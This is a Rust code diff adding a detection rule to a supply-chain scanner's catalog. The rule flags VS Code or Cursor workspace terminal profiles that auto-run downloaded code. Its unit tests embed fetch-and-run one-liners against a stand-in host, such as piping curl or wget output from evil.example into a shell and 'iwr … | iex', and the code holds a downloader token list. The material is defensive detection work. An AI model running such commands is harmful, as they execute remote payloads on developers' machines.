@@ -31,7 +31,7 @@ use serde::Serialize;
 
 /// Version of the bundled catalog. Bump whenever the rule set changes
 /// so JSON consumers can tell which fingerprints were active.
-pub const CATALOG_VERSION: &str = "2026.05.21";
+pub const CATALOG_VERSION: &str = "2026.05.27";
 
 /// How many bytes of any single file the content scanner will read.
 /// 64 KiB easily covers `.npmrc`, `pyproject.toml`, lockfile metadata,
@@ -90,6 +90,30 @@ pub enum RuleKind {
     ContentNeedle {
         needle: &'static str,
         basename_filter: Option<&'static str>,
+    },
+    /// Structural rule against a VS Code / Cursor `settings.json`:
+    /// parse the file as JSONC (strip `//` / `/* */` comments and
+    /// trailing commas before deserialising), walk
+    /// `terminal.integrated.profiles.<os>.<name>.args`, and flag a
+    /// profile whose `args` carries both a shell-exec flag
+    /// (`-c` / `/c` / `-Command` / `-EncodedCommand`) and a known
+    /// downloader / dynamic-evaluator token (`curl`, `wget`, `iwr`,
+    /// `Invoke-WebRequest`, `Invoke-Expression`, `IEX`, `eval`,
+    /// `base64 -d` / `base64 --decode`). The combination is the
+    /// VSCode-extension parallel of `tasks.json:"runOn":"folderOpen"`
+    /// — a workspace-bound terminal profile that auto-executes a
+    /// downloaded payload the moment a developer opens the terminal.
+    /// Substring-only content matching is too coarse here
+    /// (legitimate `bash --login` profiles would dominate); the
+    /// structural pass is what keeps false-positive rate honest.
+    ///
+    /// `path_suffixes` scopes which files are eligible — workspace
+    /// `.vscode/settings.json` and `.cursor/settings.json` only.
+    /// User settings (`~/.vscode/User/settings.json`, etc.) are
+    /// deliberately out of scope: out-of-tree, attribution hazier,
+    /// and outside the snapshot/diff surfaces this catalog feeds.
+    SettingsTerminalAutorun {
+        path_suffixes: &'static [&'static str],
     },
 }
 
@@ -290,6 +314,27 @@ pub fn catalog() -> &'static [Rule] {
                           ships this.",
         },
         Rule {
+            id: "editor-extension.terminal-profile-autorun-downloader",
+            family: "editor-extension",
+            severity: Severity::Medium,
+            kind: RuleKind::SettingsTerminalAutorun {
+                path_suffixes: &[".vscode/settings.json", ".cursor/settings.json"],
+            },
+            pattern: "terminal.integrated.profiles[...].args",
+            description: "Workspace `.vscode/settings.json` (or \
+                          `.cursor/settings.json`) declares a terminal \
+                          profile whose `args` carries both a shell-\
+                          exec flag (`-c`, `/c`, `-Command`, \
+                          `-EncodedCommand`) and a downloader / \
+                          dynamic-evaluator token (`curl`, `wget`, \
+                          `iwr`, `Invoke-WebRequest`, \
+                          `Invoke-Expression`, `eval`, `base64 -d`). \
+                          A devcontainer might legitimately bootstrap \
+                          this way, but a clean repo essentially never \
+                          ships it — review the matched profile before \
+                          dismissing.",
+        },
+        Rule {
             id: "exfil.pipedream-webhook",
             family: "supplychain-generic",
             severity: Severity::High,
@@ -338,12 +383,224 @@ pub fn matches(path: &Path) -> Vec<&'static Rule> {
             RuleKind::Basename => basename == rule.pattern,
             RuleKind::PathSuffix => path_ends_with(&normalised, rule.pattern),
             RuleKind::ContentNeedle { .. } => false,
+            // Structural rules need bytes — `matches()` is path-only.
+            RuleKind::SettingsTerminalAutorun { .. } => false,
         };
         if hit {
             out.push(rule);
         }
     }
     out
+}
+
+/// True iff `path` is in-scope for any rule that has structural-
+/// content semantics (i.e. needs the file's bytes parsed beyond a
+/// substring match). Today this covers
+/// [`RuleKind::SettingsTerminalAutorun`]; the result is used by
+/// [`scan_paths_in_root`] to decide whether to read the file at
+/// all.
+fn path_in_scope_for_structural(path: &Path) -> bool {
+    let normalised = normalise(path);
+    for rule in catalog() {
+        if let RuleKind::SettingsTerminalAutorun { path_suffixes } = rule.kind {
+            for suf in path_suffixes {
+                if path_ends_with(&normalised, suf) {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+/// Run every [`RuleKind::SettingsTerminalAutorun`] rule whose
+/// `path_suffixes` covers `path` against `bytes`. Returns the
+/// rules that fire — structural decision lives in
+/// [`detect_terminal_autorun_downloader`]; this function is only
+/// the wiring.
+pub fn matches_structural(path: &Path, bytes: &[u8]) -> Vec<&'static Rule> {
+    let normalised = normalise(path);
+    let mut out = Vec::new();
+    for rule in catalog() {
+        let RuleKind::SettingsTerminalAutorun { path_suffixes } = rule.kind else {
+            continue;
+        };
+        if !path_suffixes
+            .iter()
+            .any(|suf| path_ends_with(&normalised, suf))
+        {
+            continue;
+        }
+        if detect_terminal_autorun_downloader(bytes) {
+            out.push(rule);
+        }
+    }
+    out
+}
+
+/// Strip the two JSONC affordances VS Code accepts in `settings.json`:
+/// `//` line comments (until the next newline) and `/* … */` block
+/// comments, plus trailing commas before `}` / `]`. Strings (anything
+/// between unescaped double quotes) are passed through verbatim so a
+/// URL containing `//` doesn't get truncated.
+///
+/// Intentionally lenient: this isn't a spec-complete JSONC parser, it
+/// just produces something `serde_json` accepts for the
+/// terminal-profile walk. Callers must already be prepared for parse
+/// failures (fail-open).
+fn jsonc_to_json(bytes: &[u8]) -> Vec<u8> {
+    let mut out = Vec::with_capacity(bytes.len());
+    let mut i = 0;
+    let n = bytes.len();
+    let mut in_str = false;
+    let mut str_escaped = false;
+    while i < n {
+        let b = bytes[i];
+        if in_str {
+            out.push(b);
+            if str_escaped {
+                str_escaped = false;
+            } else if b == b'\\' {
+                str_escaped = true;
+            } else if b == b'"' {
+                in_str = false;
+            }
+            i += 1;
+            continue;
+        }
+        if b == b'"' {
+            in_str = true;
+            out.push(b);
+            i += 1;
+            continue;
+        }
+        if b == b'/' && i + 1 < n {
+            match bytes[i + 1] {
+                b'/' => {
+                    i += 2;
+                    while i < n && bytes[i] != b'\n' {
+                        i += 1;
+                    }
+                    continue;
+                }
+                b'*' => {
+                    i += 2;
+                    while i + 1 < n && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
+                        i += 1;
+                    }
+                    i = (i + 2).min(n);
+                    continue;
+                }
+                _ => {}
+            }
+        }
+        out.push(b);
+        i += 1;
+    }
+    // Trailing-comma strip: `,` followed by whitespace then `}` or `]`.
+    let mut stripped = Vec::with_capacity(out.len());
+    let mut j = 0;
+    let m = out.len();
+    while j < m {
+        if out[j] == b',' {
+            let mut k = j + 1;
+            while k < m && (out[k] == b' ' || out[k] == b'\t' || out[k] == b'\n' || out[k] == b'\r')
+            {
+                k += 1;
+            }
+            if k < m && (out[k] == b'}' || out[k] == b']') {
+                // Skip the comma — leave the whitespace + closing
+                // bracket in place.
+                j += 1;
+                continue;
+            }
+        }
+        stripped.push(out[j]);
+        j += 1;
+    }
+    stripped
+}
+
+/// Inspect a `settings.json`-shaped JSONC body and return `true` iff
+/// any `terminal.integrated.profiles.<os>.<profile>.args` array
+/// contains *both* a shell-exec flag and a downloader / dynamic-
+/// evaluator token in the *same* profile.
+///
+/// Both halves are required deliberately: many legitimate profiles
+/// pass `-c` to a shell as a startup hook, and many legitimate
+/// scripts mention `curl` in argument vectors that aren't shell-
+/// exec'd. Demanding the co-occurrence is what keeps the rule from
+/// drowning in false positives.
+fn detect_terminal_autorun_downloader(bytes: &[u8]) -> bool {
+    let normalised = jsonc_to_json(bytes);
+    let v: serde_json::Value = match serde_json::from_slice(&normalised) {
+        Ok(v) => v,
+        Err(_) => return false,
+    };
+    let Some(root) = v.as_object() else {
+        return false;
+    };
+    // VS Code settings.json uses *flat* dotted keys at the top level:
+    // `"terminal.integrated.profiles.linux"` is one literal key, not a
+    // nested object path. Iterate every key with that prefix and
+    // inspect its profile map.
+    for (key, by_os) in root {
+        if !key.starts_with("terminal.integrated.profiles.") {
+            continue;
+        }
+        let Some(by_os) = by_os.as_object() else {
+            continue;
+        };
+        for (_name, profile) in by_os {
+            let Some(args) = profile.get("args").and_then(|x| x.as_array()) else {
+                continue;
+            };
+            let mut has_exec_flag = false;
+            let mut has_downloader = false;
+            for arg in args {
+                let Some(s) = arg.as_str() else {
+                    continue;
+                };
+                if is_shell_exec_flag(s) {
+                    has_exec_flag = true;
+                }
+                if contains_downloader_token(s) {
+                    has_downloader = true;
+                }
+            }
+            if has_exec_flag && has_downloader {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn is_shell_exec_flag(s: &str) -> bool {
+    let t = s.trim();
+    // POSIX shells: `-c`. Windows cmd: `/c` / `/C` / `/k` / `/K`.
+    // PowerShell: `-Command` / `-c` / `-EncodedCommand` / `-e`.
+    matches!(
+        t,
+        "-c" | "/c" | "/C" | "/k" | "/K" | "-Command" | "-EncodedCommand" | "-e"
+    )
+}
+
+fn contains_downloader_token(s: &str) -> bool {
+    let lower = s.to_ascii_lowercase();
+    const TOKENS: &[&str] = &[
+        "curl",
+        "wget",
+        "iwr",
+        "invoke-webrequest",
+        "invoke-expression",
+        "iex",
+        "eval ",
+        "eval(",
+        "base64 -d",
+        "base64 --decode",
+    ];
+    TOKENS.iter().any(|t| lower.contains(t))
 }
 
 /// Decide whether `bytes` (capped to [`MAX_CONTENT_BYTES`] by the
@@ -362,6 +619,9 @@ pub fn matches_content(basename: &str, bytes: &[u8]) -> Vec<&'static Rule> {
             basename_filter,
         } = rule.kind
         else {
+            // Structural rules are handled by `matches_structural`,
+            // not here — they need the relative path, not just the
+            // basename, to apply their scope.
             continue;
         };
         if let Some(want) = basename_filter
@@ -407,19 +667,33 @@ where
             } => basename_filter.is_none_or(|want| want == basename),
             _ => false,
         });
-        if !any_content_rule_wants_this_file {
+        let structural_in_scope = path_in_scope_for_structural(rel);
+        if !any_content_rule_wants_this_file && !structural_in_scope {
             continue;
         }
         let abs = root.join(rel);
         let bytes = read_capped(&abs, MAX_CONTENT_BYTES);
-        for rule in matches_content(basename, &bytes) {
-            out.push(Finding {
-                path: rel.to_path_buf(),
-                rule_id: rule.id,
-                family: rule.family,
-                severity: rule.severity,
-                description: rule.description,
-            });
+        if any_content_rule_wants_this_file {
+            for rule in matches_content(basename, &bytes) {
+                out.push(Finding {
+                    path: rel.to_path_buf(),
+                    rule_id: rule.id,
+                    family: rule.family,
+                    severity: rule.severity,
+                    description: rule.description,
+                });
+            }
+        }
+        if structural_in_scope {
+            for rule in matches_structural(rel, &bytes) {
+                out.push(Finding {
+                    path: rel.to_path_buf(),
+                    rule_id: rule.id,
+                    family: rule.family,
+                    severity: rule.severity,
+                    description: rule.description,
+                });
+            }
         }
     }
     out
@@ -865,5 +1139,151 @@ mod tests {
         let original = ids.len();
         ids.dedup();
         assert_eq!(ids.len(), original, "catalog rule ids must be unique");
+    }
+
+    // --- settings.json terminal autorun (rule #27) -----------------------
+
+    #[test]
+    fn jsonc_normaliser_strips_line_and_block_comments_and_trailing_commas() {
+        let input = br#"{
+            // a line comment
+            "a": 1, /* a block
+                       comment */
+            "b": [1, 2, 3,],
+            "url": "https://example.com/foo//bar",
+        }"#;
+        let out = jsonc_to_json(input);
+        let v: serde_json::Value = serde_json::from_slice(&out).unwrap();
+        assert_eq!(v["a"], 1);
+        assert_eq!(v["b"], serde_json::json!([1, 2, 3]));
+        // `//` inside a string must survive — otherwise the URL gets
+        // mangled.
+        assert_eq!(v["url"], "https://example.com/foo//bar");
+    }
+
+    #[test]
+    fn terminal_autorun_fires_on_co_occurring_shell_flag_and_downloader() {
+        let body = br#"{
+          "terminal.integrated.profiles.linux": {
+            "evil": {
+              "path": "/bin/bash",
+              "args": ["-c", "curl https://evil.example/x | sh"]
+            }
+          }
+        }"#;
+        assert!(detect_terminal_autorun_downloader(body));
+    }
+
+    #[test]
+    fn terminal_autorun_fires_on_powershell_encoded_command() {
+        let body = br#"{
+          "terminal.integrated.profiles.windows": {
+            "shim": {
+              "path": "pwsh.exe",
+              "args": ["-Command", "iwr https://evil.example/x | iex"]
+            }
+          }
+        }"#;
+        assert!(detect_terminal_autorun_downloader(body));
+    }
+
+    #[test]
+    fn terminal_autorun_does_not_fire_on_legitimate_login_shell() {
+        // `bash --login` is the canonical legitimate use of a shell-
+        // exec flag in a terminal profile; the absence of a
+        // downloader/eval token is what keeps the rule from firing.
+        let body = br#"{
+          "terminal.integrated.profiles.linux": {
+            "bash-login": {
+              "path": "/bin/bash",
+              "args": ["-c", "exec /usr/bin/tmux new -A -s main"]
+            }
+          }
+        }"#;
+        assert!(!detect_terminal_autorun_downloader(body));
+    }
+
+    #[test]
+    fn terminal_autorun_requires_co_occurrence_in_same_profile() {
+        // Shell flag in one profile, downloader in another — must
+        // NOT fire. The rule's whole point is that the dangerous
+        // combination is the same profile's args.
+        let body = br#"{
+          "terminal.integrated.profiles.linux": {
+            "a": { "args": ["-c", "exec tmux"] },
+            "b": { "args": ["curl https://example.com"] }
+          }
+        }"#;
+        assert!(!detect_terminal_autorun_downloader(body));
+    }
+
+    #[test]
+    fn terminal_autorun_handles_jsonc_comments_in_settings() {
+        let body = br#"{
+            // VS Code workspace settings - JSONC, not strict JSON.
+            "terminal.integrated.profiles.osx": {
+                /* a malicious profile someone could review-bomb in */
+                "trojan": {
+                    "path": "/bin/zsh",
+                    "args": ["-c", "wget -q -O - https://evil.example/x | bash"],
+                },
+            },
+        }"#;
+        assert!(detect_terminal_autorun_downloader(body));
+    }
+
+    #[test]
+    fn terminal_autorun_rule_is_scoped_to_workspace_paths() {
+        // `.vscode/settings.json` is in scope; an arbitrary
+        // `settings.json` anywhere else (user settings, library
+        // config) is not — and matches() must still skip the
+        // structural variant entirely because it has no bytes.
+        assert!(path_in_scope_for_structural(Path::new(
+            ".vscode/settings.json"
+        )));
+        assert!(path_in_scope_for_structural(Path::new(
+            "subdir/.cursor/settings.json"
+        )));
+        assert!(!path_in_scope_for_structural(Path::new(
+            "src/foo/settings.json"
+        )));
+        assert!(!path_in_scope_for_structural(Path::new(
+            "Library/Application Support/Code/User/settings.json"
+        )));
+        // Path-only `matches()` must not return the structural rule.
+        let hits = matches(Path::new(".vscode/settings.json"));
+        assert!(
+            !hits.iter().any(|r| r.id.starts_with("editor-extension.")),
+            "structural rules must require bytes; matches() saw {:?}",
+            hits.iter().map(|r| r.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn scan_paths_in_root_fires_structural_rule_with_finding() {
+        use std::fs;
+        let tmp =
+            std::env::temp_dir().join(format!("sakimori-iocs-settings-{}", std::process::id()));
+        let _ = fs::remove_dir_all(&tmp);
+        fs::create_dir_all(tmp.join(".vscode")).unwrap();
+        fs::write(
+            tmp.join(".vscode/settings.json"),
+            br#"{
+              "terminal.integrated.profiles.linux": {
+                "boot": {
+                  "path": "/bin/bash",
+                  "args": ["-c", "curl https://evil.example/x | bash"]
+                }
+              }
+            }"#,
+        )
+        .unwrap();
+        let findings = scan_paths_in_root(&tmp, [Path::new(".vscode/settings.json")].iter());
+        let ids: Vec<_> = findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            ids.contains(&"editor-extension.terminal-profile-autorun-downloader"),
+            "expected structural rule to fire; got {ids:?}"
+        );
+        let _ = fs::remove_dir_all(&tmp);
     }
 }
